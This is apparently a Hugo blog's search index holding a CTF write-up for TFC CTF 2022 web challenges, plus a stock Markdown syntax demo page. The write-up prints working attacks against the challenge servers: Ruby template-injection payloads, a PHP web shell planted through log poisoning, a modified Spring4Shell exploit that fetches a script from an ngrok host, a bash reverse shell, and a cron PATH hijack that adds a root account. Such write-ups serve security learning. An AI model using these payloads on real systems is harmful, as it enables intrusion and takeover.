[{"content":"Participated in TFC CTF 2022 with my team CyberSpace. I only played Web and solved all web challenges (8/8).\nROBOTS AND MUSIC Web | WarmUp\nFrom the robots.txt, we can get the hidden endpoint /g00d_old_mus1c.php.\nPONG Web | WarmUp\nThis challenge is about Command Injection.\nUsing | (pipe), we can inject the command as shown below.\nAnd we can get the flag\nARE YOU THE ADMIN? Web | Easy\nFor this challenge, they provided us the source code, index.tsx, auth.ts and schema prisma, but I didn\u0026rsquo;t need them to solve this one.\nWe just need to add the extra parameter, isAdmin, in the JSON body when creating the account.\nDEEPLINKS Web | Easy\nThe challenge description gives a hint about iOS app.\nCALENDAR Web | Medium\nFrom the website, we can find out that the application is using a vulnerable version of modern-event-calendar-lite wordpress plugin.\n1 2 3 4 5 CVE-2021-24146 Lack of authorisation checks in the Modern Events Calendar Lite WP plugin, versions before 5.16.5, did not restrict access to the export files, allowing unauthenticated users to exports all events data in CSV or XML The exploit code can be found from the Exploit-DB (Wordpress Plugin Modern Events Calendar 5.16.2 - Event export)\nDIAMONDS Web | Medium\nThis challenge is about Ruby Regex Bypassing + SSTI.\nIf we attempt to submit characters such as Å (%c5), we can get the debug page due to Invalid Byte Sequence in UTF-8 error and also the part of the source code.\n1 2 if params[:input] =~ /^[0-9a-z ]+$/i @input = ERB.new(params[:input]).result(binding) It seems like there is no issue but in Ruby the ^ and $ match at the start and end of each line. Therefore if any line matches the regex, we can bypass it.\n1 2 3 4 5 6 7 8 9 # Directory Listing # Payload : \u0026lt;%= Dir.entries(\u0026#39;/\u0026#39;) %\u0026gt; curl http://01.linux.challenges.ctf.thefewchosen.com:49768/ -d \u0026#39;input=a %3C%25%3D%20Dir%2Eentries%28%27%2E%2F%27%29%20%25%3E\u0026#39; # Read Flag # Payload : \u0026lt;%= File.open(\u0026#39;flag.txt\u0026#39;).read %\u0026gt; curl http://01.linux.challenges.ctf.thefewchosen.com:49768/ -d \u0026#39;input=a %3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E\u0026#39; INCLUDE WHAT MATTERS Web | Medium\nTypical LFI challenge.\nI tried to read the flag.txt but didn\u0026rsquo;t work. As we already have LFI, we can try RCE via Log Poisoning.\n1 2 3 4 5 6 7 8 GET /?file=/etc/passwd HTTP/1.1 Host: 01.linux.challenges.ctf.thefewchosen.com:49774 User-Agent: User-Agent: \u0026lt;?php system($_GET[\u0026#39;c\u0026#39;]); ?\u0026gt; Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Now we just need to check the log file via LFI and execute our commands.\n1 2 GET /?file=/var/log/apache2/access.log\u0026amp;c=ls%20-al%20/ GET /?file=/var/log/apache2/access.log\u0026amp;c=cat%20/hidden_fl4g.txt TUBEINC Web | Hard\nWe have to get 2 flags, user and root, to complete this challenge.\nFrom the website footer, we can get the following information.\n1 2 3 4 5 6 \u0026lt;footer\u0026gt; \u0026lt;p\u0026gt;For the complete functionality of the page add the following entries to your DNS configuration and use tube.com:PORT to connect to the platform.\u0026lt;br\u0026gt; 34.65.33.171 tube.com\u0026lt;br\u0026gt; 34.65.33.171 legacy.tube.com\u0026lt;br\u0026gt; DO NOT USE THIS IN PRODUCTION!\u0026lt;/p\u0026gt; \u0026lt;/footer\u0026gt; Just add those 2 lines in the /etc/hosts file and visit the website legacy.tube.com.\n1 2 34.65.33.171 tube.com 34.65.33.171 legacy.tube.com Again from the bottom of the page, we can get the important information.\n1 2 3 4 5 6 7 \u0026lt;!-- Important! Due to the recent discovery of a major vulnerability of the used framework, this platform is now deprecated (more information at /info). It remains available only for backward compatibility reasons. DO NOT USE THIS PLATFORM IN PRODUCTION! --\u0026gt; The /info page tells us that the website is using a compromised \u0026ldquo;Spring-Boot\u0026rdquo; framework. Yeaahhhh we all can assume that this is about Spring4Shell vulnerability.\nGoogle Spring4Shell exploit and just use any exploit you want.\n1 2 git clone https://github.com/Leovalcante/spring4shell python3 spring4shell.py http://legacy.tube.com:52524 Now we can get the user flag from the /home/user.flag\nNow we need to escalate our privileges to root to get the root flag but getting a reverse shell is the trickiest part I guess. I tried multiple methods to get a reverse shell but none of them worked so I had to modify the Spring4Shell exploit to upload the rev.sh file to the server.\n1 2 3 4 5 6 7 def run_exploit(url): directory = \u0026#34;webapps/ROOT\u0026#34; filename = secrets.token_hex(16) post_headers = {\u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;} get_headers = {\u0026#34;prefix\u0026#34;: \u0026#34;\u0026lt;%\u0026#34;, \u0026#34;suffix\u0026#34;: \u0026#34;%\u0026gt;//\u0026#34;, \u0026#34;c\u0026#34;: \u0026#34;Runtime\u0026#34;, \u0026#34;d\u0026#34;: \u0026#34;\u0026lt;\u0026gt;\u0026#34;} log_pattern = (\u0026#34;class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20=%20new%20java.net.URL(request.getParameter(%22url%22)).openStream();%20java.nio.file.Files.copy(in,%20java.nio.file.Paths.get(%22/tmp/rev.sh%22));%20%25%7Bsuffix%7Di%0A\u0026#34;) rev.sh\n1 2 #!/bin/bash bash -i \u0026gt;\u0026amp; /dev/tcp/myip/port 0\u0026gt;\u0026amp;1 Now run the exploit, send request with the url parameter, and get the reverse shell :)\n1 http://legacy.tube.com:52524/3823ccc6aae29902cda00dd7c16dbccf.jsp?url=http://ngrok.site/rev.sh Check all the normal privilege escalation things and we can find that there is a cronjob we can try to exploit.\n/etc/cron.d/update\n1 2 3 SHELL=/bin/sh PATH=/var/tmp:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin * * * * * root apt update \u0026gt;\u0026gt; /var/log/cron.log The PATH includes the global writeable directory /var/tmp. That means we can create our own malicious apt file and put it in the /var/tmp direcotry to make the cronjob executes our apt file not the original apt.\napt\n1 2 #!/bin/bash echo \u0026#34;imgroot::0:0:root:/root:/bin/bash” \u0026gt;\u0026gt; /etc/passwd Now we just need to get the root flag!!!!\n1 2 $ su - imgroot # cat /root/root.flag ","date":"2022-08-01T00:00:00Z","image":"https://g0tfl4g.github.io/p/tfc-ctf-2022/img/tfc.svg","permalink":"https://g0tfl4g.github.io/p/tfc-ctf-2022/","title":"TFC CTF 2022"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution Don\u0026rsquo;t communicate by sharing memory, share memory by communicating. — Rob Pike1\nTables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables Italics Bold Code italics bold code A B C D E F Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus ultricies, sapien non euismod aliquam, dui ligula tincidunt odio, at accumsan nulla sapien eget ex. Proin eleifend dictum ipsum, non euismod ipsum pulvinar et. Vivamus sollicitudin, quam in pulvinar aliquam, metus elit pretium purus Proin sit amet velit nec enim imperdiet vehicula. Ut bibendum vestibulum quam, eu egestas turpis gravida nec Sed scelerisque nec turpis vel viverra. Vivamus vitae pretium sapien Code Blocks Code block with backticks 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Diff code block 1 2 3 4 5 [dependencies.bevy] git = \u0026#34;https://github.com/bevyengine/bevy\u0026#34; rev = \u0026#34;11f52b8c72fc3a568e8bb4a4cd1f3eb025ac2e13\u0026#34; - features = [\u0026#34;dynamic\u0026#34;] + features = [\u0026#34;jpeg\u0026#34;, \u0026#34;dynamic\u0026#34;] List Types Ordered List First item Second item Third item Unordered List List item Another item And another item Nested list Fruit Apple Orange Banana Dairy Milk Cheese Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nHyperlinked image The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2019-03-11T00:00:00Z","image":"https://g0tfl4g.github.io/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://g0tfl4g.github.io/p/markdown-syntax-guide/","title":"Markdown Syntax Guide"}]